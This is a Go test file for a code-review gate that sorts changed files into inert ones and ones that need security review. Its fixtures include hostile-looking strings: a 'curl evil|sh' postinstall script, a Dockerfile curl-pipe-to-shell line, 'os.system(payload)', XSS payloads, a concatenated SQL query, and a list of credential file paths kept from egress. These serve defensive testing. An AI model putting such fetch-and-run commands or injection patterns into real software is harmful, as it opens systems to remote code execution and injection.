package gate

import (
	"strings"
	"testing"

	"github.com/leotrace-hq/leoprevent-plugin/client/internal/transcript"
)

// ---------------------------------------------------------------------------
// POSITIVE cases: every inert component. These MUST be suppressed (Inert==true).
// ---------------------------------------------------------------------------

func TestInert_NonExecutableExtensions(t *testing.T) {
	// One case per nonExecutable entry, each with realistic prose content that
	// happens to contain code-shaped words — must STILL be inert (it's prose).
	cases := []struct {
		name string
		path string
	}{
		{"markdown md", "README.md"},
		{"markdown long", "docs/guide.markdown"},
		{"plain text", "notes.txt"},
		{"restructured text", "docs/index.rst"},
		{"asciidoc", "manual.adoc"},
		{"lockfile", "package.lock"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			c := transcript.Change{
				FilePath: tc.path,
				// Deliberately code-shaped prose: must not matter for prose files.
				AddedText: "Call requests.get(url) to fetch data; run SELECT * FROM users.",
			}
			if !inert(c) {
				t.Fatalf("expected %s to be inert (prose file)", tc.path)
			}
		})
	}
}

func TestInert_CommentOnlyDiffs_AllMarkers(t *testing.T) {
	// One case per comment marker style across representative extensions.
	cases := []struct {
		name string
		path string
		text string
	}{
		// '#' family
		{"python comment", "app.py", "# this explains the function\n# more detail"},
		{"ruby comment", "app.rb", "# ruby note"},
		{"shell comment", "deploy.sh", "# shell note"},
		{"bash comment", "x.bash", "# bash note"},
		{"zsh comment", "x.zsh", "# zsh note"},
		{"yaml comment", "config.yaml", "# yaml note"},
		{"yml comment", "config.yml", "# yml note"},
		{"terraform comment", "main.tf", "# tf note"},
		{"toml comment", "Cargo.toml", "# toml note"},
		{"ini comment", "setup.ini", "# ini note"},
		// NOTE: .env is intentionally NOT here — it is no longer comment-inert (it holds
		// secrets, and is dropped from egress upstream via IsSecretPath). See TestIsSecretPath.
		{"perl comment", "x.pl", "# perl note"},
		{"elixir comment", "x.ex", "# elixir note"},
		{"elixir script comment", "x.exs", "# elixir note"},
		{"powershell comment", "x.ps1", "# ps note"},
		// '//' family
		{"js comment", "app.js", "// js note\n// second line"},
		{"mjs comment", "app.mjs", "// note"},
		{"cjs comment", "app.cjs", "// note"},
		{"ts comment", "app.ts", "// note"},
		{"jsx comment", "app.jsx", "// note"},
		{"tsx comment", "app.tsx", "// note"},
		{"go comment", "main.go", "// go note"},
		{"java comment", "App.java", "// java note"},
		{"kotlin comment", "App.kt", "// kt note"},
		{"scala comment", "App.scala", "// scala note"},
		{"groovy comment", "App.groovy", "// groovy note"},
		{"c comment", "main.c", "// c note"},
		{"cc comment", "main.cc", "// note"},
		{"cpp comment", "main.cpp", "// note"},
		{"h comment", "x.h", "// note"},
		{"hpp comment", "x.hpp", "// note"},
		{"csharp comment", "App.cs", "// note"},
		{"fsharp comment", "App.fs", "// note"},
		{"rust comment", "main.rs", "// rust note"},
		{"swift comment", "App.swift", "// note"},
		{"objc m comment", "App.m", "// note"},
		{"objc mm comment", "App.mm", "// note"},
		{"dart comment", "main.dart", "// note"},
		{"vue comment", "App.vue", "// note"},
		{"svelte comment", "App.svelte", "// note"},
		// '--' family
		{"sql comment", "schema.sql", "-- sql note\n-- second"},
		{"lua comment", "x.lua", "-- lua note"},
		// php both markers
		{"php slash comment", "index.php", "// php note"},
		{"php hash comment", "index.php", "# php note"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if !inert(transcript.Change{FilePath: tc.path, AddedText: tc.text}) {
				t.Fatalf("expected comment-only %s to be inert", tc.path)
			}
		})
	}
}

func TestInert_CommentWithBlankLines(t *testing.T) {
	cases := []struct {
		name string
		path string
		text string
	}{
		{"comment with blank lines", "a.py", "# note\n\n# more\n"},
		{"shebang-ish bash", "run.sh", "#!/bin/bash\n# a comment"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if !inert(transcript.Change{FilePath: tc.path, AddedText: tc.text}) {
				t.Fatalf("expected %s (%q) to be inert", tc.path, tc.text)
			}
		})
	}
}

// An EMPTY (or whitespace-only) AddedText must NOT be inert: there are no added
// lines to prove the change is comment-only, so the denylist fails TOWARD review.
// This guards the monorepo/subdir bypass, where an upstream path/cwd mismatch
// produced an empty AddedText and the old vacuous-truth rule silently skipped a
// real code change.
func TestNotInert_EmptyAddedTextFailsTowardReview(t *testing.T) {
	cases := []struct {
		name string
		path string
		text string
	}{
		{"empty added text", "a.py", ""},
		{"blank-only py", "a.py", "\n  \n\t\n"},
		{"empty added text go", "main.go", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if inert(transcript.Change{FilePath: tc.path, AddedText: tc.text}) {
				t.Fatalf("expected %s (%q) to be reviewed (not inert)", tc.path, tc.text)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// NEGATIVE cases: content that RESEMBLES inert content but must NOT be
// suppressed. These guard against accidental silent discards.
// ---------------------------------------------------------------------------

func TestNotInert_RealCode(t *testing.T) {
	cases := []struct {
		name string
		path string
		text string
	}{
		{"python ssrf call", "app.py", "resp = requests.get(url)"},
		{"trailing comment is not inert", "app.py", "url = build()  # fetch the url"},
		{"comment then code", "app.py", "# fetch the url\nresp = requests.get(url)"},
		{"js integer division looks like marker", "app.js", "result = a // b"},
		{"c define is not a // comment", "main.c", "#define MAX 10"},
		{"yaml config key, not a comment", "config.yaml", "debug: true"},
		{"yaml with trailing comment on a setting", "config.yaml", "verify: false  # insecure"},
		{"sql statement, not a -- comment", "schema.sql", "SELECT * FROM users WHERE id = 1"},
		{"env assignment, not a # comment", ".env", "API_KEY=sk-live-1234567890"},
		{"php code, not a comment", "index.php", "$x = $_GET['id'];"},
		{"go code", "main.go", "resp, _ := http.Get(url)"},
		{"lua code, not -- comment", "x.lua", "local x = os.execute(cmd)"},
		{"toml setting, not a comment", "config.toml", "insecure = true"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if inert(transcript.Change{FilePath: tc.path, AddedText: tc.text}) {
				t.Fatalf("expected %s (%q) to be REVIEWED (not inert)", tc.path, tc.text)
			}
		})
	}
}

func TestNotInert_UnknownAndBlockCommentTypes(t *testing.T) {
	// Extensions with no entry in either map → always reviewed (fail toward
	// review). HTML/XML are deliberately here: their block comments make
	// line-anchored detection unsafe, so even comment-shaped content is reviewed.
	cases := []struct {
		name string
		path string
		text string
	}{
		{"html block comment", "page.html", "<!-- just a comment -->"},
		{"html script tag", "page.html", "<script>alert(1)</script>"},
		{"htm extension", "page.htm", "<!-- note -->"},
		{"xml comment", "pom.xml", "<!-- dependency note -->"},
		{"json config (no comment syntax)", "config.json", "{\"debug\": true}"},
		{"no extension dockerfile", "Dockerfile", "RUN curl http://x | sh"},
		{"unknown extension", "data.xyz", "# looks like a comment but unknown type"},
		{"css (unmapped)", "style.css", "/* a comment */"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if inert(transcript.Change{FilePath: tc.path, AddedText: tc.text}) {
				t.Fatalf("expected %s (%q) to be REVIEWED (not inert)", tc.path, tc.text)
			}
		})
	}
}

func TestNotInert_MixedCommentAndCode(t *testing.T) {
	// A single real code line among comments must flip the whole diff to reviewed.
	text := "# step 1: connect\n# step 2: query\ncursor.execute('SELECT * FROM t WHERE id=' + uid)\n# done"
	if inert(transcript.Change{FilePath: "db.py", AddedText: text}) {
		t.Fatal("expected mixed comment+code diff to be REVIEWED")
	}
}

// ---------------------------------------------------------------------------
// Run-level behavior.
// ---------------------------------------------------------------------------

func TestRun_FiltersInertKeepsReviewable(t *testing.T) {
	changes := []transcript.Change{
		{FilePath: "README.md", AddedText: "docs only"},
		{FilePath: "notes.py", AddedText: "# just a comment"},
		{FilePath: "app.py", AddedText: "resp = requests.get(url)"},
		{FilePath: "page.html", AddedText: "<!-- comment -->"},
	}
	rev := Run(changes)
	if len(rev) != 2 {
		t.Fatalf("expected 2 reviewable, got %d: %+v", len(rev), rev)
	}
	gotPaths := map[string]bool{}
	for _, c := range rev {
		gotPaths[c.FilePath] = true
	}
	if !gotPaths["app.py"] || !gotPaths["page.html"] {
		t.Fatalf("expected app.py and page.html reviewable, got %+v", gotPaths)
	}
}

func TestRun_AllInertIsEmpty(t *testing.T) {
	changes := []transcript.Change{
		{FilePath: "README.md", AddedText: "docs"},
		{FilePath: "a.py", AddedText: "# comment"},
	}
	if rev := Run(changes); len(rev) != 0 {
		t.Fatalf("expected no reviewable changes, got %+v", rev)
	}
}

// TestInert_CompiledArtifacts: compiled/binary build artifacts are never
// reviewed (generated, often binary, reviewing them is pure noise/cost). Even if
// their "added text" looks like code, the extension alone makes them inert.
func TestInert_CompiledArtifacts(t *testing.T) {
	for _, path := range []string{"app.pyc", "mod.pyo", "Main.class", "lib.so", "x.dll", "a.exe", "blob.bin", "m.wasm", "build.o", "bundle.js.map"} {
		if !inert(transcript.Change{FilePath: path, AddedText: "import os; os.system(payload)"}) {
			t.Errorf("%s should be inert (compiled/binary artifact)", path)
		}
	}
	// ...but real source with the same-looking content is NOT inert.
	if inert(transcript.Change{FilePath: "app.py", AddedText: "os.system(payload)"}) {
		t.Error("a real .py source file must still be reviewed")
	}
}

func TestInert_TestFiles(t *testing.T) {
	// Test files are dropped (via enry.IsTest) — not a shipped security surface.
	for _, path := range []string{
		"apps/frontend/merchant-app/e2e/authenticated/default-pickup-contact.e2e.test.ts",
		"libs/frontend/ui-web/src/lib/order/DevModeQuickOrderButtons.test.tsx",
		"server/internal/api/integration_test.go",
		"tests/test_app.py",
		"app/models/user_spec.rb",
		"src/test/java/com/x/FooTest.java",
		"foo.spec.ts",
	} {
		if !inert(transcript.Change{FilePath: path, AddedText: "resp = requests.get(url)"}) {
			t.Errorf("%s should be inert (test file)", path)
		}
	}
	// ...but real (non-test) source with the same content is NOT inert.
	for _, path := range []string{"main.py", "config.go", "server.go", "app.py"} {
		if inert(transcript.Change{FilePath: path, AddedText: "resp = requests.get(url)"}) {
			t.Errorf("%s must still be reviewed (not a test file)", path)
		}
	}
}

func TestRun_EmptyInput(t *testing.T) {
	if rev := Run(nil); len(rev) != 0 {
		t.Fatalf("expected empty result for nil input, got %+v", rev)
	}
}

// TestInert_VendoredDirs: dependency installs / build output are dropped
// regardless of extension OR content — even a .py/.js file with a real sink is
// not the dev's own change when it lives under node_modules/vendor/etc. This is
// the belt-and-suspenders to gitignore (covers a TRACKED node_modules and the
// gitignore-blind transcript fallback). Segment match is separator-agnostic.
func TestInert_VendoredDirs(t *testing.T) {
	for _, path := range []string{
		"node_modules/foo/index.js",
		"frontend/node_modules/lib/a.ts",
		"jspm_packages/npm/x.js",
		".pnp/cache/x.js",
		".next/server/page.js",
		".nuxt/dist/server.js",
		".svelte-kit/output/x.js",
		".angular/cache/x.js",
		".parcel-cache/x.js",
		".turbo/x.js",
		"vendor/github.com/x/y/z.go",
		"bower_components/jquery/jquery.js",
		"app/__pycache__/mod.cpython-311.pyc",
		".venv/lib/python3.11/site-packages/requests/api.py",
		"backend/venv/bin/activate.py",
		".eggs/x.py",
		".tox/py311/lib/x.py",
		".nox/x.py",
		".mypy_cache/x.json",
		".pytest_cache/v/x",
		".ruff_cache/x",
		".hypothesis/examples/x",
		".gradle/caches/x.jar",
		"ios/Pods/AFNetworking/x.m",
		".git/hooks/pre-commit",
		".svn/entries",
		".hg/store/x",
		"infra/.terraform/providers/aws/main.tf",
		`node_modules\pkg\win.js`, // windows-style separators
	} {
		// Deliberately code-shaped (a real SSRF/SQL sink) to prove it's the PATH,
		// not the content, that drops these.
		if !inert(transcript.Change{FilePath: path, AddedText: "resp = requests.get(url)"}) {
			t.Errorf("%s should be inert (vendored/generated tree)", path)
		}
	}
}

// TestNotInert_VendorLookalikes: the match is per whole SEGMENT, so a real
// source file whose NAME merely contains a vendored token is still reviewed.
func TestNotInert_VendorLookalikes(t *testing.T) {
	for _, path := range []string{
		"internal/vendor.go",          // file named vendor.go, not under vendor/
		"src/node_modules_helper.js",  // segment is node_modules_helper, not node_modules
		"app/venv_setup.py",           // venv_setup, not venv
		"pkg/site-packages-loader.go", // not the site-packages segment
	} {
		if inert(transcript.Change{FilePath: path, AddedText: "resp = requests.get(url)"}) {
			t.Errorf("%s should be REVIEWED (vendor token is only part of a segment)", path)
		}
	}
}

// TestNotInert_AmbiguousBuildDirs locks in the conservative choice: bare
// build-output names routinely hold hand-authored source/scripts, so they are
// deliberately NOT in vendoredDirs and must still reach the reviewer. (gitignore
// handles them per-project; the gate must not silently drop real code.)
func TestBuildDirPolicy(t *testing.T) {
	// Build / compiler output & caches are skipped (generated from source, not authored).
	for _, path := range []string{
		"dist/app.py", // enry-vendored
		"build/main.go",
		"out/handler.js",
		"target/run.rs",
		"obj/Debug/x.cs",
		"Debug/x.cpp",
		"Release/x.cpp",
		"cmake-build-debug/x.cpp",   // cmake-build* prefix
		"cmake-build-release/y.cpp", // cmake-build* prefix
		".cache/x.js",
		"__snapshots__/App.test.js.snap",
	} {
		if !inert(transcript.Change{FilePath: path, AddedText: "resp = requests.get(url)"}) {
			t.Errorf("%s should be INERT (build/compiler output)", path)
		}
	}
	// bin/ is intentionally still REVIEWED — it commonly holds real deploy/utility scripts.
	if inert(transcript.Change{FilePath: "bin/deploy.sh", AddedText: "resp = requests.get(url)"}) {
		t.Error("bin/deploy.sh should be REVIEWED (bin/ holds real scripts)")
	}
	// coverage/ is a first-party DOMAIN word (insurance/health/fintech) — deliberately
	// NOT skipped, so a real coverage/ module reaches the reviewer. A .py under it is
	// reviewable; a coverage HTML *report* is accepted noise (HTML is always reviewed).
	if inert(transcript.Change{FilePath: "coverage/eligibility.py", AddedText: "os.system(payload)"}) {
		t.Error("coverage/eligibility.py should be REVIEWED (coverage/ is a domain word, not a build dir)")
	}
}

// TestBuildDirPolicy_AbsolutePathsNotDropped guards the gitless-fallback case: there
// FilePath is ABSOLUTE (the agent's tool-input path), so an AMBIGUOUS build-output
// segment (build/out/target/obj/Debug/Release) appearing as an ANCESTOR dir must NOT
// mark real code inert — else a project living under e.g. /home/me/out/proj/ would have
// every change silently dropped (a review bypass). Unambiguous vendored trees
// (node_modules, .venv, __pycache__) must still drop even when absolute.
func TestBuildDirPolicy_AbsolutePathsNotDropped(t *testing.T) {
	code := "resp = requests.get(url)"
	// Absolute path whose ANCESTOR is an ambiguous build segment → must stay REVIEWABLE.
	for _, path := range []string{
		"/home/me/out/proj/app.py",
		"/Users/me/build/service/handler.js",
		"/tmp/target/cmd/main.go",
	} {
		if inert(transcript.Change{FilePath: path, AddedText: code}) {
			t.Errorf("%s should be REVIEWED (ambiguous build segment as ancestor of an absolute path)", path)
		}
	}
	// Unambiguous vendored trees must still be dropped even on an absolute path.
	for _, path := range []string{
		"/home/me/proj/node_modules/pkg/index.js",
		"/home/me/proj/.venv/lib/mod.py",
	} {
		if !inert(transcript.Change{FilePath: path, AddedText: code}) {
			t.Errorf("%s should be INERT (unambiguous vendored tree, even absolute)", path)
		}
	}
}

// TestVendor_EnryUnionAndCarveout locks the enry.IsVendor adoption: the trees enry
// adds beyond the hand list are skipped, the hand-list floor (venvs, VCS) still
// works, and the CI carve-out keeps pipeline definitions reviewable.
func TestVendor_EnryUnionAndCarveout(t *testing.T) {
	skip := []string{
		"dist/bundle.js",         // enry-added
		"third_party/lib.go",     // enry-added
		"Godeps/_workspace/x.go", // enry-added
		".venv/lib/python3.11/site-packages/requests/api.py", // hand-list floor (enry misses)
		".git/hooks/pre-commit",                              // hand-list floor
		".turbo/x.js",                                        // hand-list floor
	}
	for _, p := range skip {
		if !vendored(p) {
			t.Errorf("%s should be vendored (skipped)", p)
		}
	}
	// CI pipelines: Linguist vendors these, but they're a security surface — keep reviewable.
	for _, p := range []string{".github/workflows/ci.yml", "Jenkinsfile", "ci/.github/workflows/deploy.yaml"} {
		if vendored(p) {
			t.Errorf("%s must stay REVIEWABLE (CI security surface), got vendored", p)
		}
	}
}

// TestIsSecretPath: credential/secret files are dropped from egress; ordinary
// source is not. .env is also asserted NOT comment-inert (it left commentMarkers).
func TestIsSecretPath(t *testing.T) {
	secret := []string{
		".env", ".env.local", ".env.production",
		"id_rsa", "id_ed25519", ".netrc", ".pgpass", ".htpasswd", ".npmrc",
		"server.pem", "tls.key", "cert.pfx", "store.p12", "keystore.jks",
		"deep/nested/dir/.env", `windows\style\.env.prod`,
		// credential-bearing artifacts — never-egress (Terraform secrets, HTTP captures).
		"prod.tfvars", "terraform.tfstate", "infra/main.tfvars", "capture.har",
	}
	for _, p := range secret {
		if !IsSecretPath(p) {
			t.Errorf("IsSecretPath(%q) = false, want true (secret material must not egress)", p)
		}
	}
	notSecret := []string{
		"main.go", "app.py", "config.yaml", "README.md", "envreader.go",
		"keyboard.js", "environment.ts", "src/key_helpers.go",
	}
	for _, p := range notSecret {
		if IsSecretPath(p) {
			t.Errorf("IsSecretPath(%q) = true, want false (ordinary source)", p)
		}
	}
	// .env is no longer comment-inert: even an all-comment .env must NOT be dropped as
	// inert (its real changes are KEY=value; secrets are handled by IsSecretPath upstream).
	if inert(transcript.Change{FilePath: ".env", AddedText: "# just a comment"}) {
		t.Error("comment-only .env must no longer be treated as inert")
	}
}

// TestInert_ArchivesAndBinaryData: archives, binary data/db dumps, compiled artifacts,
// and extra media are dropped by extension fast-path (no content needed).
func TestInert_ArchivesAndBinaryData(t *testing.T) {
	drop := []string{
		"release.zip", "backup.tar", "logs.tar.gz", "bundle.tgz", "data.xz", "img.zst", "old.7z", "a.rar",
		"features.parquet", "events.avro", "table.orc", "model.pkl", "weights.npy", "arr.npz",
		"dump.h5", "store.hdf5", "app.sqlite", "app.sqlite3", "cache.db", "dump.rdb", "blob.dat",
		"addon.node", "lib.rlib", "sym.pdb", "pkg.whl", "gem.gem", "lib.nupkg",
		"clip.mov", "movie.mkv", "sound.flac", "voice.m4a", "photo.heic", "art.psd", "logo.ai",
	}
	for _, p := range drop {
		if !inert(transcript.Change{FilePath: p, AddedText: "binary"}) {
			t.Errorf("inert(%q) = false, want true (binary/archive artifact)", p)
		}
	}
}

// TestInert_BackupAndTempAndGenerated: editor/patch backups, temp files, IDE metadata,
// and the `.generated.` codegen infix are dropped; a plain source file is not.
func TestInert_BackupAndTempAndGenerated(t *testing.T) {
	drop := []string{
		"config.yaml.bak", "main.go.orig", "patch.rej", "scratch.tmp", "work.temp",
		"main.go~", ".#main.go", "#main.go#", // editor backup / lock copies
		"module.iml",
		"types.generated.ts", "api.generated.go", "schema.generated.cs", // codegen infix
	}
	for _, p := range drop {
		if !inert(transcript.Change{FilePath: p, AddedText: "x := 1"}) {
			t.Errorf("inert(%q) = false, want true (backup/temp/codegen artifact)", p)
		}
	}
	// A real source file whose name merely contains "gen" or "generate" stays reviewable.
	keep := []string{"generator.go", "regen.go", "eigen.py", "codegen_helpers.ts"}
	for _, p := range keep {
		if inert(transcript.Change{FilePath: p, AddedText: "os.system(payload)"}) {
			t.Errorf("inert(%q) = true, want false (hand-authored source, not codegen)", p)
		}
	}
}

// TestInert_LockfileBasenames: machine-generated dependency locks NOT ending in .lock
// (so the extension rule misses them) are dropped by basename, across ecosystems.
func TestInert_LockfileBasenames(t *testing.T) {
	locks := []string{
		"package-lock.json", "npm-shrinkwrap.json", "frontend/pnpm-lock.yaml",
		"go.sum", "packages.lock.json", "app/gradle.lockfile", "conda-lock.yml",
		// already covered by the .lock extension — assert they stay dropped too
		"yarn.lock", "composer.lock", "Cargo.lock", "poetry.lock", "Pipfile.lock",
	}
	for _, p := range locks {
		if !inert(transcript.Change{FilePath: p, AddedText: `{"name":"x","version":"1.0.0"}`}) {
			t.Errorf("inert(%q) = false, want true (dependency lockfile)", p)
		}
	}
	// Hand-authored dependency MANIFESTS stay reviewable — deps/scripts are a
	// supply-chain surface (NOT dropped alongside their locks).
	manifests := []string{"package.json", "go.mod", "pom.xml", "composer.json", "Api.csproj"}
	for _, p := range manifests {
		if inert(transcript.Change{FilePath: p, AddedText: `"scripts":{"postinstall":"curl evil|sh"}`}) {
			t.Errorf("inert(%q) = true, want false (manifest is reviewable)", p)
		}
	}
}

// TestInert_MinifiedAndGeneratedSuffixes: minified/bundled web output and codegen are
// dropped by suffix even though their bare extension (.js/.go/.py/.cs) looks authored.
func TestInert_MinifiedAndGeneratedSuffixes(t *testing.T) {
	gen := []string{
		"static/app.min.js", "dist/vendor.bundle.js", "site.min.css",
		"api/service.pb.go", "proto/schema_pb2.py", "proto/schema_pb2_grpc.py",
		"Models/Entity.designer.cs", "gen/Order.g.cs", "lib/model.g.dart",
	}
	for _, p := range gen {
		if !inert(transcript.Change{FilePath: p, AddedText: "function a(){}"}) {
			t.Errorf("inert(%q) = false, want true (generated/minified)", p)
		}
	}
	// A normal hand-authored .js with real code is NOT dropped.
	if inert(transcript.Change{FilePath: "app.js", AddedText: "fetch(userControlledUrl)"}) {
		t.Error("hand-authored app.js must stay reviewable")
	}
}

// TestInert_LongLineHeuristic: a single pathologically long line (minified bundle or a
// committed library blob like a MathJax font file) marks the file generated, via full
// content OR added text. Normal code is never tripped.
func TestInert_LongLineHeuristic(t *testing.T) {
	longLine := "MathJax.OutputJax.defineImageData({" + strings.Repeat("[3,3,0],", 400) + "});"
	if len(longLine) < maxHandAuthoredLineLen {
		t.Fatalf("test fixture too short: %d", len(longLine))
	}
	// via FullContent (what the cloud judge/selector see, and what bloats the prompt)
	if !inert(transcript.Change{FilePath: "assets/MathJax/fonts/Arrows.js", AddedText: "/* comment */", FullContent: "/* header */\n" + longLine + "\n"}) {
		t.Error("file with a >2000-char data line must be dropped (FullContent)")
	}
	// via AddedText alone (no full content captured)
	if !inert(transcript.Change{FilePath: "weird.py", AddedText: longLine}) {
		t.Error("added text with a >2000-char line must be dropped")
	}
	// normal multi-line code is never tripped
	normal := "def handler(req):\n    url = req.args.get('u')\n    return requests.get(url)\n"
	if inert(transcript.Change{FilePath: "views.py", AddedText: normal, FullContent: normal}) {
		t.Error("normal code must NOT be dropped by the long-line heuristic")
	}
}

// TestInert_AssetExtensions: fonts/images/media/translation/tabular data are dropped;
// .svg is deliberately KEPT (can carry script), while a GENERATED long-line svg is
// dropped by content.
func TestInert_AssetExtensions(t *testing.T) {
	drop := []string{"fonts/x.woff2", "img/logo.png", "img/a.jpg", "data/rows.csv",
		"locale/de.po", "i18n/messages.xliff", "doc.pdf", "clip.mp4"}
	for _, p := range drop {
		if !inert(transcript.Change{FilePath: p, AddedText: "binary-ish"}) {
			t.Errorf("inert(%q) = false, want true (non-code asset/data)", p)
		}
	}
	// .svg stays reviewable — a small hand-crafted SVG can carry XSS (onload/<script>).
	if inert(transcript.Change{FilePath: "icon.svg", AddedText: `<svg onload="alert(1)"></svg>`}) {
		t.Error("small .svg must stay reviewable (SVG can carry active content)")
	}
	// ...but a giant generated SVG (one long path-data line) IS dropped by content.
	bigSVG := `<svg><path d="` + strings.Repeat("M0 0L1 1", 400) + `"/></svg>`
	if !inert(transcript.Change{FilePath: "huge-icon.svg", AddedText: bigSVG, FullContent: bigSVG}) {
		t.Error("generated long-line .svg must be dropped by the content heuristic")
	}
}

// TestNotInert_SecurityRelevantConfigKept: config/data formats that can hold real
// findings must NOT be dropped — they stay reviewable.
func TestNotInert_SecurityRelevantConfigKept(t *testing.T) {
	keep := map[string]string{
		"appsettings.json": `{"ConnectionStrings":{"db":"Server=...;Password=hunter2"}}`,
		"web.xml":          `<security-constraint><web-resource-collection/></security-constraint>`,
		"Dockerfile":       "RUN curl http://x | sh",
		"schema.sql":       "GRANT ALL ON *.* TO 'app'@'%';",
		"nginx.conf":       "proxy_pass http://internal;",
		"notebook.ipynb":   `{"cells":[{"source":["os.system(payload)"]}]}`,
	}
	for p, body := range keep {
		if inert(transcript.Change{FilePath: p, AddedText: body, FullContent: body}) {
			t.Errorf("inert(%q) = true, want false (security-relevant, must be reviewed)", p)
		}
	}
}

// ---------------------------------------------------------------------------
// Net-new data/log extensions (logs, diffs, line-delimited data) — inert.
// ---------------------------------------------------------------------------

func TestInert_DataAndLogExtensions(t *testing.T) {
	for _, path := range []string{
		"run.log", "server.err", "batch.out",
		"result.diff", "fix.patch",
		"data/events.jsonl", "stream.ndjson",
	} {
		t.Run(path, func(t *testing.T) {
			c := transcript.Change{FilePath: path, AddedText: "anything\nsecond line\n"}
			if !inert(c) {
				t.Fatalf("expected %s to be inert (data/log artifact)", path)
			}
		})
	}
}

// enry backstop: generated code the hand suffix-list does not enumerate should
// still be suppressed; genuine hand-written source must still be reviewed.
func TestInert_EnryGeneratedBackstop(t *testing.T) {
	// A protobuf-generated Go file — not in generatedSuffixes, caught by enry.
	gen := transcript.Change{
		FilePath:  "api/service.pb.go",
		AddedText: "// Code generated by protoc-gen-go. DO NOT EDIT.\npackage api\n",
	}
	if !inert(gen) {
		t.Fatal("expected api/service.pb.go (generated) to be inert via enry backstop")
	}
	// Config stays reviewable (must NOT be skipped by enry).
	cfg := transcript.Change{FilePath: "config.json", AddedText: `{"cors":"*"}`}
	if inert(cfg) {
		t.Fatal("config.json must remain reviewable (config is security-relevant)")
	}
}
